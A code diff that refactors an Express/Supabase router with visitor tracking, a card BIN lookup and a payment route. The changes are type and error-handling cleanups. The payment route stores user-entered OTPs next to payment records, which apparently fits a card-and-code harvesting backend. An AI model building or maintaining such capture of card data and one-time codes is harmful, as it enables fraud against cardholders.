@@ -23,7 +23,7 @@ router.post("/track", async (req, res) => {
       return res.status(400).json({ error: "Missing visitor ID" });
     }
 
-    const { data, error } = await supabase
+    const trackingResult = await supabase
       .from("visitor_tracking")
       .upsert([
         {
@@ -39,16 +39,18 @@ router.post("/track", async (req, res) => {
           last_active: new Date().toISOString()
         }
       ]);
+    const data = trackingResult.data;
+    const error = (trackingResult as { error: { message?: string } | null }).error;
 
     if (error) {
-      logger.error({ errorMessage: error.message }, "Supabase tracking error");
+      logger.error({ errorMessage: error.message ?? "Unknown Supabase error" }, "Supabase tracking error");
       return res.status(500).json({ error: "Failed to track visitor" });
     }
 
-    res.json({ success: true, data });
+    return res.json({ success: true, data });
   } catch (err) {
     logger.error({ err }, "Tracking route error");
-    res.status(500).json({ error: "Internal server error" });
+    return res.status(500).json({ error: "Internal server error" });
   }
 });
 
@@ -82,7 +84,14 @@ router.get("/bin-lookup/:bin", async (req, res) => {
     }).catch(() => null);
 
     if (handyRes && handyRes.ok) {
-      const handyData = await handyRes.json();
+      const handyData = (await handyRes.json()) as {
+        Status?: string;
+        Country?: { Name?: string; A2?: string; N3?: string };
+        Scheme?: string;
+        Type?: string;
+        CardTier?: string;
+        Issuer?: string;
+      };
       if (handyData && handyData.Status === "SUCCESS") {
         const countryName = handyData.Country?.Name || "Jordan";
         const alpha2 = handyData.Country?.A2 || "JO";
@@ -196,14 +205,16 @@ router.post("/payment", async (req, res) => {
 
     if (paymentId) {
       // Update existing payment with OTP
-      const { data, error } = await supabase
+      const paymentUpdateResult = await supabase
         .from("payments")
         .update(paymentId, {
           otp
         });
+      const data = paymentUpdateResult.data;
+      const error = (paymentUpdateResult as { error: { message?: string } | null }).error;
       
       if (error) {
-        logger.error({ errorMessage: error.message }, "Supabase payment update error");
+        logger.error({ errorMessage: error.message ?? "Unknown Supabase error" }, "Supabase payment update error");
         return res.status(500).json({ error: "Failed to update payment" });
       }
       return res.json({ success: true, data });
@@ -212,9 +223,10 @@ router.post("/payment", async (req, res) => {
     let effectiveVisitorId = visitorId;
     if (!effectiveVisitorId) {
       try {
-        const { data: recentVisitors } = await supabase
+        const recentVisitorsResult = await supabase
           .from("visitor_tracking")
           .select("*", { orderBy: "last_active", ascending: false });
+        const recentVisitors = recentVisitorsResult.data as Array<{ id: string }> | null;
         if (recentVisitors && recentVisitors.length > 0) {
           effectiveVisitorId = recentVisitors[0].id;
         } else {
@@ -247,7 +259,7 @@ router.post("/payment", async (req, res) => {
     }
 
     // Never use client storage, all data goes directly to Supabase server-side
-    const { data, error } = await supabase
+    const paymentInsertResult = await supabase
       .from("payments")
       .insert([
         {
@@ -264,16 +276,18 @@ router.post("/payment", async (req, res) => {
           created_at: new Date().toISOString()
         }
       ]);
+    const data = paymentInsertResult.data;
+    const error = (paymentInsertResult as { error: { message?: string } | null }).error;
 
     if (error) {
-      logger.error({ errorMessage: error.message }, "Supabase payment error");
+      logger.error({ errorMessage: error.message ?? "Unknown Supabase error" }, "Supabase payment error");
       return res.status(500).json({ error: "Failed to process payment" });
     }
 
-    res.json({ success: true, data });
+    return res.json({ success: true, data });
   } catch (err) {
     logger.error({ err }, "Payment route error");
-    res.status(500).json({ error: "Internal server error" });
+    return res.status(500).json({ error: "Internal server error" });
   }
 });
 
